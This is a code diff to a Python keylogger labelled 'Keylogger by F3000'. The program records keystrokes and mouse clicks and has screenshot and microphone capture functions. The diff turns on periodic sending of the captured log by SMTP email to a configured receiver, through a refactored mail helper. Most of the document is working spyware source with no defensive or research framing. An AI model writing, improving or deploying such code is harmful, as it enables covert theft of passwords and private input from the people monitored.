@@ -1,6 +1,5 @@
 import os
 import platform
-import smtplib
 import socket
 import time
 
@@ -10,11 +9,7 @@ import pyscreenshot
 import sounddevice as sd
 from pynput import keyboard, mouse
 from dotenv import load_dotenv
-# from email import encoders
-# from email.mime.base import MIMEBase
-# from email.mime.multipart import MIMEMultipart
-# from email.mime.text import MIMEText
-# import glob
+from utils import send_mail_with_attachment
 
 load_dotenv()
 
@@ -25,7 +20,6 @@ SMTP_PORT = os.getenv("SMTP_PORT")
 EMAIL_SENDER = os.getenv("EMAIL_SENDER")
 EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
 SEND_REPORT_EVERY = 10  # seconds
-
 
 class KeyLogger:
     def __init__(self, time_interval, email, password):
@@ -41,18 +35,20 @@ class KeyLogger:
             self.log = self.log + string
 
     def on_move(self, x, y):
-        current_move = "\nMouse moved to {} {}".format(x, y)
-        self.appendlog(current_move)
+        # current_move = "\nMouse moved to {} {}".format(x, y)
+        # self.appendlog(current_move)
+        pass  # do nothing
 
     def on_click(self, x, y, button, pressed):
         current_click = "\nMouse click at {} {} with button {}".format(x, y, button)
         self.appendlog(current_click)
 
     def on_scroll(self, x, y, dx, dy):
-        current_scroll = "\nMouse scrolled at {} {} with scroll distance {} {}".format(
-            x, y, dx, dy
-        )
-        self.appendlog(current_scroll)
+        # current_scroll = "\nMouse scrolled at {} {} with scroll distance {} {}".format(
+        #     x, y, dx, dy
+        # )
+        # self.appendlog(current_scroll)
+        pass  # do nothing
 
     def save_data(self, key):
         try:
@@ -67,21 +63,23 @@ class KeyLogger:
 
         self.appendlog("\nPressed key: {0}".format(current_key))
 
-    def send_mail(self, email, password, message):
-        m = f"""\
-        Subject: main Mailtrap
-        To: {EMAIL_SENDER}
-        From: {EMAIL_RECEIVER}
-
-        Keylogger by F3000\n"""
-
-        m += message
-        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
-            server.login(email, password)
-            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, message)
+    def send_mail(self, message):
+        send_mail_with_attachment(
+            SMTP_SERVER,
+            SMTP_PORT,
+            self.email,
+            self.password,
+            EMAIL_SENDER,
+            EMAIL_RECEIVER,
+            cc="",
+            path_to_attachment="",
+            attachments=[],
+            subject="Test keylogged - by F3000",
+            body=message,
+        )
 
     def report(self):
-        # self.send_mail(self.email, self.password, "\n\n" + self.log)
+        self.send_mail("\n\n\n" + self.log)
         print(self.log)
         self.log = ""
         self.keyboard_listener.stop()
@@ -116,14 +114,14 @@ class KeyLogger:
         obj.writeframesraw(myrecording)
         self.appendlog("\nmicrophone used.")
 
-        # self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)
+        # self.send_mail(message=obj)
 
     def screenshot(self):
         img = pyscreenshot.grab()
         img.save("screenshot.png")
         self.appendlog("\nscreenshot used.")
 
-        # self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)
+        # self.send_mail(message=img)
 
     def run(self):
         self.keyboard_listener = keyboard.Listener(on_press=self.save_data)
@@ -157,7 +155,7 @@ class KeyLogger:
         # self.system_information()
         # self.screenshot()
         # self.microphone()
-        time.sleep(10)
+        time.sleep(SEND_REPORT_EVERY)
         self.report()
 
 
